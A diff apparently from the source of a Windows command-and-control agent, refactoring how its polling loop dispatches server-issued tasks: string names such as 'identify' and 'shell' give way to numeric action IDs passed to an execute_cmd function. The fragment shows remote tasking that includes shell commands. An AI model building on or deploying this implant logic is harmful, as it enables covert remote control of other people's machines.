@@ -2,10 +2,11 @@
 #include <Lmcons.h>
 #include <Windows.h>
 
+#include <types.h>
 #include <init.h>
 #include <http_client.h>
-#include <commands.h>
 #include <communication.h>
+#include <commands.h>
 
 #include <config.h>
 
@@ -47,12 +48,8 @@ int main() {
 
       for (int i = 0; i < tasksCount; i++) {
         int taskId = extractInt32(&tasksTLV);
-        int taskNameSize = extractInt32(&tasksTLV);
-
-        char * taskName = malloc(taskNameSize + 1);
-        extractBytes(&tasksTLV, taskNameSize, taskName);
-        taskName[taskNameSize] = 0x00;
-
+        
+        int taskActionId = extractInt32(&tasksTLV);
         int argBytes = extractInt32(&tasksTLV); 
         char * args = malloc(argBytes + 1);
         extractBytes(&tasksTLV, argBytes, args);
@@ -66,17 +63,9 @@ int main() {
 
         PRINT_HEX(tlvArgs.buf, tlvArgs.bufsize);
 
-        printf("[+] Got task ID: %u\n", taskId);
-        printf("    -> TaskName: %s\n", taskName); 
-        printf("    -> ArgsBuf: %.*s (%u bytes)\n", tlvArgs.bufsize, tlvArgs.buf, tlvArgs.bufsize); 
-
-        if (strcmp(taskName, "identify") == 0) 
-          agent_identify(taskId);
-        else if (strcmp(taskName, "shell") == 0)
-          shell_cmd(taskId, extractInt32(&tlvArgs), &tlvArgs);
+        execute_cmd(taskActionId, taskId, extractInt32(&tlvArgs), &tlvArgs);
 
         free(args);
-        free(taskName);
       }
 
       Sleep(5000);
